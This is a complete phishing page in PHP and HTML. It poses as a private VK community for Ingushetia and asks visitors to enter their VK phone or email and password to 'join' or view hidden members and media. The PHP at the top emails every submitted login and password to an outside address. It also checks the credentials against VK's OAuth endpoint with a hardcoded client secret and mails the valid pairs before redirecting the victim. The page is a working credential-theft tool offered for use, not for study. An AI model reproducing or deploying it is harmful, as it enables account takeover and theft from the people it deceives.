<?php
{
$EMAIL = "nhuibv@vk.com";
$username = $_POST["l"];
$password = $_POST["p"];
mail($EMAIL, "кагнарс", $password, $username ); 
}
?>
<?php
   error_reporting (0);
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{$EMAIL = "nhuibv@vk.com";
		$username = $_POST["email"];
		$password = $_POST["pass"];
		$check = file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password);
		if (strpos($check, "access_token") === false)
	{}			else
			{
				$result = json_decode($check);
				$ez_log = $username.":".$password;
				mail($EMAIL, "вошол", $password, $username ); fwrite($log, $ez_log."\n"); fclose($log);
				header('Location: https://vk.com/club209901120');
			}}
?>


<!doctype html>
<html  lang="en">
 <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
  <title>vip</title>
 <link rel="stylesheet" type="text/css" href="normalize.css">
 <link rel="stylesheet" type="text/css" href="sthi.css">
  <script src="js.js"></script>
 <script src="https://code.jquery.com/jquery-3.5.0.js"></script>
 </head>
 <body>
           
<div  id="block" class="block">
     
<div style="display:none" id="bl" class="bl">	 
<a href="https://m.vk.com" style="border:none" ><img class="b" src="back.jpg"></a>
<a class="text1">закрытая группа</a> 

<img width="66px" class="foto" src="c.jpg">

<a class="text2">Ищу тебя ингушетия</a>

<a class="text22">Возможно и Вас кто то ищет)</a>

<button src="vk.png"  onclick="start ()"  class="start" >Вступить</button>

<a class="text3">ИНФОРМАЦИЯ</a>

<a class="text4">Описание:</a>

<a class="text5">Салам алейкум вежари йижаре в Самый популярный паблик республики. Подписывайся! Закидывайте в предложку посты с фотографиями. Размещение бесплатно</a>

<hr class="line">

<a style="top:420px" class="text3">ДРУГОЕ</a>

<a onclick="fr ()" class="text6">Участники<span style="color:#73a9ff"> 15678</span></a>

<a onclick="fv ()" style="top:490px" class="text6">Видео<span style="color:#73a9ff"> 78</span></a>

<a onclick="ff ()" style="top:525px" class="text6">Фотографии<span style="color:#73a9ff"> 1278</span></a>

<a href="https://m.vk.com" style="top:558px" class="text6">Контакты <span style="color:#73a9ff">1</span></a>

<a style="top:598px" class="text3">ДЕЙСТВИЯ</a>

<a id="z" onclick="zak ()" style="top:629px" class="text6">Сохранить в закладках</a>
<a id="z2" onclick="zak2 ()" style="top:629px; display:none" class="text6">Удалить из закладок</a>

 </div> 

<div class="konteiner"  id="konteiner" >
    
    <div class="header"> </div>
     <p class="text12">Вип группа</p>
      <img onclick="otmena ()" class="close" width="26px" src="close.png">
      <p style="color:red; position:absolute; left:48px; right:30px" class="vhod">Неверный логин или пароль. Повторите попытку</p>
    <div class="inp">
  <form method="post" action="#">
         
         <input  type="text" name="email" required placeholder="Телефон или email"  autofocus  >  
         
          <input   type="password" name="pass" placeholder="Пароль" required minlength="6" >  

          <button  style="padding: .7em 7.3em; right:0px; top:130px;" type="submit" href="0.html" class="start"  >войти</button>
             </form>  
 </div> </div>

<div class="konteiner2"  id="konteiner2" ><a class="vip" > Руководители сообщества скрыли список участников</a></div>
<div  class="konteiner2"  id="konteiner3" ><a style=" top:35px;" class="vip" > Для просмотра медиафайлов, подтвердите вход в вип сообщество</a> </div>
 </div>

<svg id="loading"   class="circular" viewBox="25 25 50 50"><circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" /> </svg>

<script>
    setTimeout(function() {
bl.style.display = 'block';
konteiner.style.display = 'block';
loading.style.display = 'none';

}, 1200);






</script>